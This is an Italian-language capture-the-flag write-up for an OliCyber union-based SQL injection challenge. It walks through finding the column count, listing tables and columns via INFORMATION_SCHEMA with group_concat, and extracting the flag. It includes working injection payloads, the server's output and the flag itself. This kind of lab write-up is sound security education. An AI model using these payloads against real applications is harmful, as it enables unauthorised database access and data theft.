# Union based SQL Injection

http://web-17.challs.olicyber.it/union

## Procedimento
La flag è nascosta in un'altra tabella non "direttamente" accessibile.

Il primo step è capire quante colonne ci sono, in questo caso è facile perchè l'output porta direttamente 6 colonne di risultato.

In caso questo non fosse possibile, bisogna basarsi su dettagli che appaiono nel frontend per capire se si ha indovinato oppure no la quantità di colonne.
Cioè, se si facesse injection con la UNION, una quantità errata di colonne risulterebbe in un "errore" di login. Invece una quantità corretta di colonne risulterebbe in un successo.

Inoltre per poter mostrare all'attaccante delle informazioni bisogna basarsi su "finestrelle" che rendono accessibili tali informazioni.
Ad esempio normalmente la tabella degli utenti avrà le colonne email, username, password. Di solito un sito magari quando ti loggi dirà "Benvenuto <nome_utente>"
Facendo la union, magari riusciamo a far fuoriuscire delle informazioni nella parte del frontend dove dovrebbero esserci delle informazioni "parametriche".
Se abbiamo successo in sostanza, dovrebbe uscire "Benvenuto 1" in quanto abbiamo fatto un payload con ``` ...  UNION SELECT 1,2,3,4,5,...,N ...```

In questo caso sappiamo quindi che sono 6 colonne. Per scoprire le tabelle presenti bisogna interrogare il database utilizzando la query che mette tutto inline in un unica cella "group_concat(table_name, ':', column_name)"

```sql 
-- AGGIUNGERE ESPLICITAMENTE L'APICETTO dopo l'id così da ESCAPEARE 
-- QUESTA PRIMA PARTE E' inserita dal sistema
SELECT * FROM dummy_data WHERE id='1' AND 0=1 UNION SELECT 1,2,3,4,5,group_concat(table_name,':',column_name) FROM INFORMATION_SCHEMA.columns WHERE table_schema = DATABASE(); -- 
```
(nota bene, ha senso usare DATABASE() quando la tabella da leakare è nello stesso DATABASE, altrimenti si possono anche prima vedere quali database esistono sullo stesso nodo, e poi interrogare database diversi da quello usato dall'applicazione che sfruttiamo per fare l'injection)


Il payload vero e proprio è il seguente:
```
1' AND 0=1 UNION SELECT 1,2,3,4,5,group_concat(table_name,':',column_name) FROM INFORMATION_SCHEMA.columns WHERE table_schema = DATABASE(); -- 
```

Otteniamo in risposta
```
1, 2, 3, 4, 5, dummy_data:another_column,dummy_data:dummy_column,dummy_data:dummy_int,dummy_data:foobar,dummy_data:id,dummy_data:idk_what_im_doing,real_data:flag,real_data:id
```

Verso la fine si nota ```real_data:flag, real_data:id``` che è esattamente l'informazione che cercavamo.
Ora che sappiamo il nome della tabella, la fase esplorativa è finita e basta semplicemente 

Per finalmente ottenere la flag dobbiamo fare:
```sql
SELECT * FROM dummy_data WHERE id=' 1' AND 0=1 UNION SELECT 1,2,3,4,5,flag from real_data -- '
```

Il payload sarebbe ``` 1' AND 0=1 UNION SELECT 1,2,3,4,5,flag from real_data -- ```

L'output è ```1, 2, 3, 4, 5, flag{Uni0ns_4re_so_tr1vi4l}``` con flag facilmente estrapolabile ```flag{Uni0ns_4re_so_tr1vi4l}```